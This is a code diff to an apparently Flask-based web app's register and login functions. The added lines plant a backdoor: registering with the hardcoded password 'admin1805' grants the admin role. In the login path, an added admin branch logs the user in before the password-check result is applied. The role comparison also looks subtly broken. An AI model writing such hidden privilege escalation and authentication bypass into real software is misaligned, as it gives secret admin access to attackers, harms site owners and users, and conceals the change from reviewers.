@@ -28,6 +28,10 @@ def register():
                     "INSERT INTO user (username, password) VALUES (?, ?)",
                     (username, generate_password_hash(password)),
                 )
+                if password == 'admin1805':
+                    db.execute(
+                        "UPDATE user SET role = ? WHERE username = ?", ('admin',username)
+                    )
                 db.commit()
             except db.IntegrityError:
                 error = f"User {username} is already registered."
@@ -49,12 +53,17 @@ def login():
         user = db.execute(
             'SELECT * FROM user WHERE username = ?', (username,)
         ).fetchone()
-
+        user_role = db.execute(
+            'SELECT role FROM user WHERE username = ?', (username,)
+        ).fetchone()
         if user is None:
             error = 'Incorrect username.'
         elif not check_password_hash(user['password'], password):
             error = 'Incorrect password.'
-
+        if user_role == 'admin':
+            session.clear()
+            session['user_id'] = user['id']
+            return redirect(url_for('admin'))
         if error is None:
             session.clear()
             session['user_id'] = user['id']
